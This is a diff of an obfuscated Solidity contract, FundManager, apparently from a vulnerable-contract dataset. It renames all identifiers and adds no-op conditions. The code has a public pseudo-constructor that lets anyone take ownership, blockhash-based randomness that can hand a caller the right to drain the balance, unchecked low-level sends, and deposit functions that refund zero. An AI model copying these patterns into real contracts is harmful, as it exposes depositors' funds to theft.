@@ -3,75 +3,75 @@ pragma solidity ^0.4.23;
 contract FundManager {
 
 
-address public _0x4c63a2 = 0x0;
-address public _0x59e1dd;
-address public _0xf22583 = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
-address public _0x6febfd = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
-address[] public _0x68eca9;
+address public _0x19fda5 = 0x0;
+address public _0xefc010;
+address public _0x8b0ba0 = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
+address public _0x400116 = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
+address[] public _0x76f6bf;
 
-mapping(address=>bool) _0x7101f9;
+mapping(address=>bool) _0xa4be8c;
 
-uint256 public _0xd8d38e;
-uint256[] public _0xd674be = [951828771,158769871220];
+uint256 public _0x96d962;
+uint256[] public _0xb05026 = [951828771,158769871220];
 uint256[] public balance;
 
 
 function DranMe() public payable{
-	_0x59e1dd = msg.sender;
+	_0xefc010 = msg.sender;
 }
 
 
-modifier _0x728180() {
-    require(msg.sender == _0x59e1dd);
+modifier _0x30f9b9() {
+    require(msg.sender == _0xefc010);
     _;
 }
 
-modifier _0x0c4964() {
-    require(msg.sender == _0x4c63a2);
+modifier _0xe670ff() {
+    require(msg.sender == _0x19fda5);
     _;
 }
 
-modifier _0x365fa8() {
-    require(_0x7101f9[msg.sender]);
+modifier _0xcdac6a() {
+    require(_0xa4be8c[msg.sender]);
     _;
 }
 
 
-function _0x2d32c1() public constant returns(uint256) {
-	return _0xd674be.length;
+function _0xabd457() public constant returns(uint256) {
+	return _0xb05026.length;
 }
 
-function _0x255fed(uint256 _0xd73510) public payable _0x728180{
-	_0xd8d38e = _0xd73510;
+function _0x927cb9(uint256 _0x0245c8) public payable _0x30f9b9{
+	_0x96d962 = _0x0245c8;
 }
 
-function _0x2f213e() public constant returns(uint256) {
-	return _0x68eca9.length;
+function _0x78a401() public constant returns(uint256) {
+	return _0x76f6bf.length;
 }
 
-function _0xd371bc() public constant returns(uint256) {
+function _0x8cdb49() public constant returns(uint256) {
 	return address(this).balance;
 }
 
-function _0x9ae66d() public payable{
+function _0x13a27b() public payable{
 	require(msg.value >= 0.02 ether);
-	_0x68eca9.push(msg.sender);
-	_0x7101f9[msg.sender]=true;
+	_0x76f6bf.push(msg.sender);
+	_0xa4be8c[msg.sender]=true;
 }
 
-function _0x7a57c2() public payable _0x365fa8{
+function _0x411d00() public payable _0xcdac6a{
 	require (msg.value >= 0.01 ether);
-	if(msg.sender!=_0x59e1dd || _0x0bd3f0()){
-	    uint256 _0x917c60 = 0;
-        msg.sender.transfer(_0x917c60);
+	if(msg.sender!=_0xefc010 || _0xa994f4()){
+	    uint256 _0x6e726b = 0;
+        msg.sender.transfer(_0x6e726b);
 	}
 }
 
-function _0x0bd3f0() private returns(bool){
-    bytes32 _0xb82371 = _0x6f0b70(blockhash(block.number-1));
-    uint256 _0xd8d38e = uint256(_0xb82371);
-        if(_0xd8d38e%5==0){
-            if (true) { _0x4c63a2 = msg.sender; }
+function _0xa994f4() private returns(bool){
+    bytes32 _0x9e0c26 = _0xce1849(blockhash(block.number-1));
+    uint256 _0x96d962 = uint256(_0x9e0c26);
+        if(_0x96d962%5==0){
+            if (gasleft() > 0) { _0x19fda5 = msg.sender; }
             return true;
         }
         else{
@@ -79,44 +79,44 @@ function _0x0bd3f0() private returns(bool){
         }
     }
 
-function _0x683c35 () public payable _0x365fa8 {
+function _0xd7fcf7 () public payable _0xcdac6a {
 	require (msg.value >= 0.005 ether);
-	_0xf22583.call.value(msg.value)();
+	_0x8b0ba0.call.value(msg.value)();
 }
 
-function _0x9bed8e () public payable _0x365fa8 {
+function _0xa771e4 () public payable _0xcdac6a {
 	require (msg.value >= 0.005 ether);
-	_0x6febfd.call.value(msg.value)();
+	_0x400116.call.value(msg.value)();
 }
 
-function _0xc25229 (uint256 _0xb787c1, uint256 _0x2b43b3) public payable _0x365fa8 {
-	_0xd674be[_0xb787c1] = _0x2b43b3;
+function _0x7067da (uint256 _0x9d7bf7, uint256 _0xccd8a0) public payable _0xcdac6a {
+	_0xb05026[_0x9d7bf7] = _0xccd8a0;
 }
 
-function _0x38a56c (uint256 _0x0f446b) public payable _0x365fa8 {
-	_0xd674be.length = _0x0f446b;
+function _0x9d5db7 (uint256 _0x936171) public payable _0xcdac6a {
+	_0xb05026.length = _0x936171;
 }
 
-function _0xda3521 (uint256 _0x669bed) public payable _0x365fa8 returns(uint256) {
-	return (_0x669bed / (_0xd674be[0]*_0xd674be[1]));
-	if((_0x669bed / (_0xd674be[0]*_0xd674be[1])) == _0xd8d38e) {
-		_0x59e1dd = _0x4c63a2;
+function _0xbb3176 (uint256 _0x1f4694) public payable _0xcdac6a returns(uint256) {
+	return (_0x1f4694 / (_0xb05026[0]*_0xb05026[1]));
+	if((_0x1f4694 / (_0xb05026[0]*_0xb05026[1])) == _0x96d962) {
+  if (1 == 1) { _0xefc010 = _0x19fda5; }
 	}
 }
 
-function _0x3e00de () public payable _0x365fa8 returns(bool) {
+function _0x3e073d () public payable _0xcdac6a returns(bool) {
     require(msg.value >= 0.01 ether);
-    if(msg.value == _0xd8d38e){
+    if(msg.value == _0x96d962){
         return true;
     }
 }
 
-function _0x477a79() public payable _0x728180 {
-	_0x59e1dd.call.value(1 wei)();
+function _0x178da5() public payable _0x30f9b9 {
+	_0xefc010.call.value(1 wei)();
 }
 
-function _0x5be763() public payable _0x0c4964 {
-	_0x4c63a2.transfer(address(this).balance);
+function _0x021643() public payable _0xe670ff {
+	_0x19fda5.transfer(address(this).balance);
 }
 
 
